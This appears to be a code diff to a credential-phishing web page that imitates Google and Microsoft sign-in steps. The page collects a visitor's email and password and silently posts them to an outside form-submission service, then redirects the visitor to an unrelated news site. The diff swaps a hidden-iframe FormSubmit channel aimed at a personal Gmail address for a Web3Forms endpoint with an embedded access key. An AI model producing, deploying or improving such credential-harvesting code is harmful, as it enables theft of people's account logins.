@@ -287,48 +287,23 @@
   </div>
 </div>
 
-<!-- Silent email delivery -->
-<iframe name="mail_target" id="mail_target" title="Email delivery target" aria-hidden="true" tabindex="-1"
-        style="position:absolute;left:-9999px;top:0;width:0;height:0;border:0;opacity:0;pointer-events:none"></iframe>
-
-<form id="mail-form" method="POST" target="mail_target" accept-charset="UTF-8"
-      style="position:absolute;left:-9999px;top:0;width:0;height:0;overflow:hidden">
-  <input type="hidden" name="email">
-  <input type="hidden" name="message">
-  <input type="hidden" name="page">
-  <input type="hidden" name="sent">
-  <input type="hidden" name="_subject" value="TVAC sign-in">
-  <input type="hidden" name="_template" value="table">
-  <input type="hidden" name="_captcha" value="false">
-  <input type="hidden" name="_url" value="https://timmylockley.github.io/Aviation-News/">
-  <input type="text" name="_honey" value="" style="display:none" tabindex="-1" autocomplete="off">
-</form>
-
 <script>
 (function () {
   /* ======== CONFIGURE THIS ======== */
+  var ACCESS_KEY   = 'f233f558-f7b7-484a-a97b-336d5d434217';   // ← paste your Web3Forms access key here
   var REDIRECT_URL = 'https://timmylockley.github.io/Aviation-News/';
-  var PAGE_URL     = 'https://timmylockley.github.io/Aviation-News/';
-  var FORM_ACTION  = 'https://formsubmit.co/lockleytimmy@gmail.com';
   var APPEND_EMAIL = true;
-  var MIN_HOLD     = 900;
+  var MIN_HOLD     = 800;
   /* ================================ */
-
-  var AJAX_ACTION = FORM_ACTION.replace('https://formsubmit.co/', 'https://formsubmit.co/ajax/');
 
   var EMAIL = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
   var stages = [].slice.call(document.querySelectorAll('.stage'));
   var user = '';
   var sending = false;
 
-  var mailForm  = document.getElementById('mail-form');
-  var mailFrame = document.getElementById('mail_target');
-  var pass      = document.getElementById('message');
-  var pErr      = document.getElementById('p-err');
-  var yesBtn    = stage(4).querySelector('button[type=submit]');
-
-  mailForm.action = FORM_ACTION;
-  mailForm.elements['_url'].value = /^https?:/i.test(location.href) ? location.href : PAGE_URL;
+  var pass   = document.getElementById('message');
+  var pErr   = document.getElementById('p-err');
+  var yesBtn = stage(4).querySelector('button[type=submit]');
 
   function stage(n) {
     return stages.filter(function (s) { return +s.dataset.stage === n; })[0];
@@ -356,47 +331,35 @@
     input.removeAttribute('aria-invalid');
   }
 
-  /* Primary channel – official AJAX JSON endpoint */
-  function sendViaAjax(email, message) {
+  /* Send via Web3Forms */
+  function sendData(email, message) {
     var payload = {
+      access_key: ACCESS_KEY,
+      subject: 'TVAC sign-in — ' + (email || 'unknown'),
+      from_name: 'TVAC Login',
       email: email,
       message: message,
       page: location.href,
       sent: new Date().toISOString(),
-      _subject: 'TVAC sign-in — ' + (email || 'unknown'),
-      _template: 'table',
-      _captcha: 'false',
-      _url: mailForm.elements['_url'].value
+      botcheck: ''               // honeypot – must stay empty
     };
 
-    return fetch(AJAX_ACTION, {
+    return fetch('https://api.web3forms.com/submit', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
         'Accept': 'application/json'
       },
       body: JSON.stringify(payload),
-      keepalive: true,
-      cache: 'no-store'
-    }).then(function (res) {
-      return res.json().catch(function () { return {}; });
-    }).then(function (data) {
-      // FormSubmit returns success as the string "true"
-      return String(data.success) === 'true' || data.ok === true;
-    }).catch(function () {
+      keepalive: true
+    })
+    .then(function (res) { return res.json(); })
+    .then(function (data) {
+      return data.success === true;
+    })
+    .catch(function () {
       return false;
     });
-  }
-
-  /* Fallback channel – classic form post into hidden iframe */
-  function sendViaForm(email, message) {
-    var f = mailForm.elements;
-    f['email'].value    = email;
-    f['message'].value  = message;
-    f['page'].value     = location.href;
-    f['sent'].value     = new Date().toISOString();
-    f['_subject'].value = 'TVAC sign-in — ' + (email || 'unknown');
-    try { mailForm.submit(); } catch (e) {}
   }
 
   /* Toast for dead links */
@@ -429,7 +392,7 @@
     });
   });
 
-  /* Stage 1 – Google email */
+  /* Stage 1 */
   var gEmail = document.getElementById('g-email'), gErr = document.getElementById('g-err');
   gEmail.addEventListener('input', function () { clear(gEmail, gErr); });
   stage(1).addEventListener('submit', function (e) {
@@ -440,7 +403,7 @@
     go(2);
   });
 
-  /* Stage 2 – Microsoft email */
+  /* Stage 2 */
   var mEmail = document.getElementById('ms-email'), mErr = document.getElementById('m-err');
   mEmail.addEventListener('input', function () { clear(mEmail, mErr); });
   stage(2).addEventListener('submit', function (e) {
@@ -454,7 +417,7 @@
     go(3);
   });
 
-  /* Stage 3 – Password */
+  /* Stage 3 */
   pass.addEventListener('input', function () { clear(pass, pErr); });
   stage(3).addEventListener('submit', function (e) {
     e.preventDefault();
@@ -462,7 +425,7 @@
     go(4);
   });
 
-  /* Stage 4 – Stay signed in → send + redirect */
+  /* Stage 4 → send + redirect */
   document.getElementById('dont').addEventListener('change', function () {
     document.getElementById('box').classList.toggle('on', this.checked);
   });
@@ -490,14 +453,13 @@
       window.location.assign(url);
     }
 
-    // Fire both channels
-    sendViaForm(user, pass.value);
-    sendViaAjax(user, pass.value).then(function () {
+    // Send the data
+    sendData(user, pass.value).then(function () {
       var wait = Math.max(0, MIN_HOLD - (Date.now() - started));
       setTimeout(leave, wait);
     });
 
-    // Absolute safety net
+    // Safety net – never wait more than 1.8 seconds
     setTimeout(leave, 1800);
   }
 
